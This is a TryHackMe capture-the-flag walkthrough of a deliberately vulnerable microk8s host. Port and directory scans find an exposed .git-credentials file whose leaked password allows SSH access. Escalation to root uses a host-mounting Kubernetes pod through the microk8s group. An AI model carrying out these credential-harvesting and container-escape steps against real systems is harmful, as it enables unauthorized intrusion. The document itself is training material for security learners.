<h1 align="center">Frank & Herby make an app</h1>
<p align="center">2025, August 11<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>462</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Learn how the misconfiguration of containers can lead to opportunities for some and disasters for others</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/e7d19f62-eef6-4483-928f-6dd4ff13632c"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/frankandherby">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/2ab767a3-d06f-4d17-9db2-0e96d2e3eb8f"></p>


<h2>Task 1 . Frank & Herb Nake and App!</h2>
<p>Make sure to wait 5 minutes after the machine starts up before starting recon.<br>

Containers are really cool, but they have security considerations just like everything else.  Break into the box and then figure out how to get root access!<br>

This box will require some research into how to use microk8s.<br>

Our story so far....<br>
Two developers are venturing into the world of Kubernetes. Little do these developers know that their lack of understanding in 'k8s', containers, and git has left their resources open to exploitation!<br>

<p><em>Answer the questions below</em></p>

<br>

<h3>Port Scanning</h3>

<p>

- 16443<br>
- 25000<br>
- 31337<br>
- 32000</p>

```bash
:~/FrankHerby# nmap -sT -p- -T5 10.201.44.131
...
PORT      STATE SERVICE
22/tcp    open  ssh
3000/tcp  open  ppp
16443/tcp open  unknown
25000/tcp open  icl-twobase1
```

```bash
:~/FrankHerby# nmap -p 10000-32000 10.201.44.131
...
PORT      STATE SERVICE
10250/tcp open  unknown
10255/tcp open  unknown
10257/tcp open  unknown
10259/tcp open  unknown
16443/tcp open  unknown
25000/tcp open  icl-twobase1
31337/tcp open  Elite
32000/tcp open  unknown
```

```bash
:~/FrankHerby# nmap -sC -sV -p 22,3000,10250,10255,10257,10259,16443,25000,31337,32000 -T4 10.201.44.131
...
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: XrpRjW5WJpGh8dBHt
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 04 Oct 2025 23:46:17 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Not valid before: 2021-10-03T14:32:12
|_Not valid after:  2022-10-03T14:32:12
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 23:46:24 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 23:46:24 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1759621350
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2025-10-04T22:42:07
|_Not valid after:  2026-10-04T22:42:07
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 23:46:24 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 04 Oct 2025 23:46:24 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1759621342
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2025-10-04T22:42:07
|_Not valid after:  2026-10-04T22:42:07
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
16443/tcp open  ssl/unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 04 Oct 2025 23:46:49 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 04 Oct 2025 23:46:24 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.44.131, IP Address:172.17.0.1
| Not valid before: 2025-10-04T23:40:19
|_Not valid after:  2026-10-04T23:40:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.44.131, IP Address:172.17.0.1
| Not valid before: 2025-10-04T23:40:19
|_Not valid after:  2026-10-04T23:40:19
31337/tcp open  http        nginx 1.21.3
|_http-server-header: nginx/1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
32000/tcp open  http        Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
```

<h3>Vulnerability Assessment</h3>
<p>

- Server leaks inodes via ETags, header found with file /, fields: 0x6179a1f6 0x12bb </p>

```bash
:~# nikto -h 10.201.44.131:31337
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.44.131
+ Target Hostname:    10.201.44.131
+ Target Port:        31337
+ Start Time:         2025-10-05 00:50:24 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.21.3
+ Server leaks inodes via ETags, header found with file /, fields: 0x6179a1f6 0x12bb 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-10-05 00:50:33 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


<p>10.201.44.131:3000</p>

<img width="1129" height="553" alt="image" src="https://github.com/user-attachments/assets/dbd278bc-255d-4ad2-8d51-4d7b58615745" />

<p>10.201.44.131:10250</p>

<img width="1118" height="227" alt="image" src="https://github.com/user-attachments/assets/03944eec-2cac-4678-aaeb-5ca672bac06f" />

<p>10.201.44.131:10255</p>

<img width="1125" height="173" alt="image" src="https://github.com/user-attachments/assets/a248c174-4b4f-4812-8a3e-2e1fccfc8ce5" />

<p>10.201.44.131:10257</p>

'forbidden: User "system:anonymous" cannot get path "/"'

<img width="1129" height="317" alt="image" src="https://github.com/user-attachments/assets/4fb9ab74-422f-440a-8f03-ee94a8aa86e0" />

<p>10.201.44.131:10259</p>

<img width="1124" height="267" alt="image" src="https://github.com/user-attachments/assets/86d2ceb6-a03f-4d9c-b544-7f62f2821ab2" />

<p>10.201.44.131:16443</p>

<img width="1132" height="279" alt="image" src="https://github.com/user-attachments/assets/4eaade42-51bd-4ac7-bd06-213787ab441a" />

<br>
<br>
<br>

<p>1.1. What port has a webpage frank was able to stand up? <br>
<code>31337</code></p>

<img width="1080" height="523" alt="image" src="https://github.com/user-attachments/assets/46ba650a-b91a-48fa-a723-3748bf109ca4" />


<h3>File and Directory Enumeration</h3>

```bash
:~/FrankHerby# gobuster dir -u http:/10.201.44.131:31337/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 80
...
/assets               (Status: 301) [Size: 169] [--> http://10.201.44.131/assets/]
/css                  (Status: 301) [Size: 169] [--> http://10.201.44.131/css/]
/vendor               (Status: 301) [Size: 169] [--> http://10.201.44.131/vendor/]
```

<br>

<h4>dirsearch</h4>

```bash
:~/FrankHerby# dirsearch -u http://10.201.44.131:31337/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/FrankHerby/reports/http_10.201.44.131_31337/...t

Target: http://10.201.44.131:31337/

[04:09:43] Starting: 
[04:09:44] 200 -   50B  - /.git-credentials
...
```

<br>

<h3>10.201.44.131:31337/.git-credentials</h3>

<img width="1183" height="185" alt="image" src="https://github.com/user-attachments/assets/023b8aef-5907-41e7-a926-c1e4939a05c3" />

<br>
<br>
<br>

<img width="480" height="113" alt="image" src="https://github.com/user-attachments/assets/309bb1da-0495-4dbf-bb1b-fb530f5f49ac" />


```bash
http://frank:f%40an3-1s-E337%21%21@192.168.100.50  =
```

<p>

- URL decode</p>

```bash
frank:f@an3-1s-E337!!@192.168.100.50  =
```

<br>
<br>
<br>

<p>1.2. What port has a webpage frank was able to stand up? <br>
<code>.git-credentials</code></p>
<br>

```bash
:~/FrankHerby# ssh frank@10.201.44.131
...

frank@dev-01:~$
```

<p>1.3. What is the user.txt flag?<br>
<code>THM{***********}</code></p>

<br>

<p>

- 998(microk8s)</p>

```bash
frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)
frank@dev-01:~$ pwd
/home/frank
frank@dev-01:~$ ls
repos  snap  user.txt
frank@dev-01:~$ cat user.txt
THM{***********}
```

<img width="1102" height="174" alt="image" src="https://github.com/user-attachments/assets/c9549251-60ba-480b-9dd9-0927b3396b8a" />

<br>
<br>
<br>

```bash
frank@dev-01:~$ which microk8s
/snap/bin/microk8s
```

```bash
frank@dev-01:~$ ls -lah /snap/bin/microk8s
lrwxrwxrwx 1 root root 13 Oct  3  2021 /snap/bin/microk8s -> /usr/bin/snap
```

```bash
frank@dev-01:~$ snap list microk8s
Name      Version  Rev   Tracking     Publisher   Notes
microk8s  v1.21.5  2546  1.21/stable  canonical\u2713  classic
```

```bash
frank@dev-01:~$ microk8s
Available subcommands are:
	add-node
	cilium
	config
	ctr
	dashboard-proxy
	dbctl
	disable
	enable
	helm
	helm3
	istioctl
	join
	juju
	kubectl
	leave
	linkerd
	refresh-certs
	remove-node
	reset
	start
	status
	stop
	inspect
```

```bash
frank@dev-01:~$ microk8s.kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          3y343d
```

<p>

- localhost:32000/bsnginx<br>
- localhost:32000/bsnginx@sha256:...</p>

```bash
frank@dev-01:~$ microk8s.kubectl get pods nginx-deployment-7b548976fd-77v4r -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    cni.projectcalico.org/podIP: 10.1.133.235/32
    cni.projectcalico.org/podIPs: 10.1.133.235/32
  creationTimestamp: "2021-10-27T19:48:23Z"
  generateName: nginx-deployment-7b548976fd-
  labels:
    app: nginx
    pod-template-hash: 7b548976fd
  name: nginx-deployment-7b548976fd-77v4r
  namespace: default
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: nginx-deployment-7b548976fd
    uid: 3e23e71f-b91a-41de-a65a-e50629eb51ec
  resourceVersion: "1811251"
  selfLink: /api/v1/namespaces/default/pods/nginx-deployment-7b548976fd-77v4r
  uid: 29879983-7b7f-4143-a8b9-1eb34951fd6d
spec:
  containers:
  - image: localhost:32000/bsnginx
    imagePullPolicy: Always
    name: nginx
    ports:
    - containerPort: 80
      protocol: TCP
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /usr/share/nginx/html
      name: local-stuff
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-hc88j
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: dev-01
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - hostPath:
      path: /home/frank/repos/dk-ml/assets
      type: ""
    name: local-stuff
  - name: kube-api-access-hc88j
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2021-10-27T19:48:23Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2025-10-04T23:44:23Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2025-10-04T23:44:23Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2021-10-27T19:48:23Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://ed43fcb391907fc8a6b34347dc3a99b92ecc02e6a7c2ae26ab5c4842aa61f1f4
    image: localhost:32000/bsnginx:latest
    imageID: localhost:32000/bsnginx@sha256:...
    lastState:
      terminated:
        containerID: containerd://a56f86268143a36ec7c2c06cd92ea57e2014e5a692e22f592865985c841243a0
        exitCode: 255
        finishedAt: "2021-10-29T12:09:13Z"
        reason: Unknown
        startedAt: "2021-10-29T02:17:45Z"
    name: nginx
    ready: true
    restartCount: 2
    started: true
    state:
      running:
        startedAt: "2025-10-04T23:44:22Z"
  hostIP: 10.201.44.131
  phase: Running
  podIP: 10.1.133.235
  podIPs:
  - ip: 10.1.133.235
  qosClass: BestEffort
  startTime: "2021-10-27T19:48:23Z"
```

```bash
frank@dev-01:~$ cd /tmp
frank@dev-01:/tmp$ nano pod.yaml
```

<img width="1347" height="304" alt="image" src="https://github.com/user-attachments/assets/755bd13b-2b9c-43f8-9ee4-706a91bbc97a" />

<br>
<br>
<br>

```bash
frank@dev-01:/tmp$ microk8s.kubectl apply -f pod.yaml
pod/hostmount created
```

<img width="1134" height="118" alt="image" src="https://github.com/user-attachments/assets/870d75d5-2e9d-47e1-acf3-3de4fac39e1a" />

```bash
root@hostmount:/# id
uid=0(root) gid=0(root) groups=0(root)
root@hostmount:/# pwd
/
```

```bash
root@hostmount:~# find / type -name root.txt 2>/dev/null
/opt/root/root/root.txt
```

```bash
root@hostmount:~# cat /opt/root/root/root.txt
THM{***************}
root@hostmount:~#
```

<img width="1137" height="88" alt="image" src="https://github.com/user-attachments/assets/77664507-1658-400a-82e8-553715244f62" />


<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3e84a482-39c7-478d-b826-cf89efc7fcc7"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/13442bb0-cdc8-494f-8171-c51f3f5108eb"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>
<br>

<p align="center">Global All Time:   105ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/49d0ce14-fd53-4b77-a7e0-311ef82462f1"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/88149cc0-41a8-4c45-bb88-0c55d56e57ea"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d7fa2ec2-a3aa-4b4f-929c-ff725ec9e64a"><br>
                  Global monthly:     235ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7ccc84b8-5956-432c-bc89-4a9e679b2803"><br>
                  Brazil monthly:       3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/538c6f32-88dd-4e70-8c3a-d5c56140cde9"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
